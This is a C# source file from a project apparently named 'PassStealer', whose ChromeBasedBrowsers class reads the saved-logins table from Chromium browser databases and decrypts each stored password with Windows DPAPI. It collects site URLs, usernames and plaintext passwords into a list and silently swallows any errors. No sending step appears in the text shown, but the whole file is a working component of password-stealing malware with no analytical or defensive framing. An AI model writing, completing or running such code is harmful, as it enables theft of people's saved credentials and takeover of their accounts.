using System;
using System.Collections.Generic;
using System.Data;
using System.Reflection;
using System.Text;
using System.Data.SQLite;
namespace PassStealer
{
	public class ChromeBasedBrowsers
	{
		public static void decrypt(List<string> db_ways, List<string[]> general)
		{

            if (db_ways != null)
			{
				try
				{
					foreach (string current in db_ways)
					{
                        
						string[] array = new string[4];
						array[0] = "################################################";
						array[1] = current;
						array[2] = "################################################";
						general.Add(array);
						int count = general.Count;
						string arg = "logins";
						byte[] entropyBytes = null;
						string connstring = "data source=" + current + ";New=True;UseUTF16Encoding=True";
						DataTable dataTable = new DataTable();
                       
                        string commandstring = string.Format("SELECT * FROM {0}", arg);
                        var connection = new SQLiteConnection(connstring);
                        var command = new SQLiteCommand(commandstring, connection);
                        var adapter = new SQLiteDataAdapter(command);
                        adapter.Fill(dataTable);
						int count2 = dataTable.Rows.Count;
						for (int i = 0; i < count2; i++)
						{
							string[] array2 = new string[4];
							array2[0] = string.Format("{0})", i + count + 1);
							array2[1] = (string)dataTable.Rows[i][1];
							array2[2] = (string)dataTable.Rows[i][3];
							byte[] cipherTextBytes = (byte[])dataTable.Rows[i][5];
							string text3;
							byte[] bytes = DPAPI.Decrypt(cipherTextBytes, entropyBytes, out text3);
							string @string = new UTF8Encoding(true).GetString(bytes);
							array2[3] = @string;
							general.Add(array2);
						}
					}
				}
				catch
				{
				}
			}
		}
	}
}
